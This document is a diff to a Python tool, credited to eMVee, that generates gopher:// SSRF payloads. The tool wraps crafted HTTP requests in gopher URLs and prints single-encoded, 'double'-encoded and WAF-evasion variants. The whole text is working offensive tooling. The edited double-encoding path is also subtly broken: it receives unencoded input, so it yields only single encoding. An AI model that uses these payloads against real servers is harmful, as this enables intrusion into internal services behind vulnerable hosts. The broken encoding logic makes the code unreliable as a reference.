@@ -16,31 +16,27 @@ Created by eMVee
     return banner
 
 def url_encode_payload(data):
-    encoded_data = data.replace(' ', '%20').replace('=', '%3d').replace('&', '%26')
-    encoded_data = encoded_data.replace('\n', '%0a')
-    return encoded_data
+    # Force encoding of all characters, including slashes, by setting safe=''
+    return urllib.parse.quote(data, safe='')
 
 def double_url_encode_payload(data):
-    encoded_data = data.replace(':', '%3a').replace('%20', '%2520')
-    encoded_data = encoded_data.replace('%0a', '%250a')
-    return encoded_data
+    # Re-encode the already single-encoded string
+    return urllib.parse.quote(data, safe='')
 
 def another_option(data):
-    encoded_data = data.replace(':', '%3a').replace('/', '%2F').replace('%20', '%2520')
-    encoded_data = encoded_data.replace('%0a', '%250a')
-    return encoded_data
+    # Alternative encoding method tailored for specific WAFs or tools like Burp Suite
+    return data.replace(':', '%3a').replace('/', '%2F').replace('%20', '%2520').replace('%0A', '%250a').replace('%0D', '%250d')
 
 def host_header(host):
     return "Host: " + host
 
-def generate_gopher_request(host, port, endpoint, method, post_data=""):
-    if method == "POST":
-        return f"gopher://{host}:{port}/_{method} {endpoint} HTTP/1.1"
+def generate_gopher_request(host, port, endpoint, method):
     return f"gopher://{host}:{port}/_{method} {endpoint} HTTP/1.1"
 
 def generate_gopher_payload(host, port, endpoint, custom_headers, method, post_data=""):
-    payload = generate_gopher_request(host, port, endpoint, method) + "\n"
-    payload += host_header(host) + "\n"
+    # Strictly use \r\n (CRLF) as required by the HTTP protocol specification
+    payload = generate_gopher_request(host, port, endpoint, method) + "\r\n"
+    payload += host_header(host) + "\r\n"
     
     if method == "POST" and post_data:
         if "Content-Type" not in custom_headers:
@@ -49,9 +45,9 @@ def generate_gopher_payload(host, port, endpoint, custom_headers, method, post_d
             custom_headers["Content-Length"] = str(len(post_data))
 
     for header, value in custom_headers.items():
-        payload += f"{header}: {value}\n"
+        payload += f"{header}: {value}\r\n"
     
-    payload += "\n"
+    payload += "\r\n"
     
     if method == "POST" and post_data:
         payload += post_data
@@ -133,18 +129,26 @@ def main():
                 custom_headers[header.strip()] = value.strip()
 
     try:
-        print("\n[!] Plain text payload:")
-        print("\n")
         payload = generate_gopher_payload(host, port, endpoint, custom_headers, method, post_data)
-        print(payload)
+        
+        print("\n[!] Plain text payload (Visualized CRLF):")
+        # Explicitly display \r\n characters for easier visual debugging in the terminal
+        print(payload.replace('\r', '\\r').replace('\n', '\\n\n'))
 
-        encoded_payload = url_encode_payload(payload)
+        # The gopher:// prefix must remain unencoded, only the HTTP request block gets encoded
+        gopher_prefix = f"gopher://{host}:{port}/_"
+        http_part = payload[len(gopher_prefix):]
+        final_single_encoded = gopher_prefix + url_encode_payload(http_part)
+
         print("\n[!] URL encoded payload:")
-        print(encoded_payload)
+        print(final_single_encoded)
+        
         print("\n[!] Double URL encoded payload:")
-        print(double_url_encode_payload(encoded_payload))
+        # Depending on the SSRF backend implementation, the prefix may or may not need encoding
+        print(gopher_prefix + double_url_encode_payload(http_part))
+        
         print("\n[!] Another option that might work via something like BURP:")
-        print(another_option(encoded_payload))
+        print(another_option(final_single_encoded))
 
     except KeyboardInterrupt:
         print("\n[!] Script interrupted by user. Exiting...")
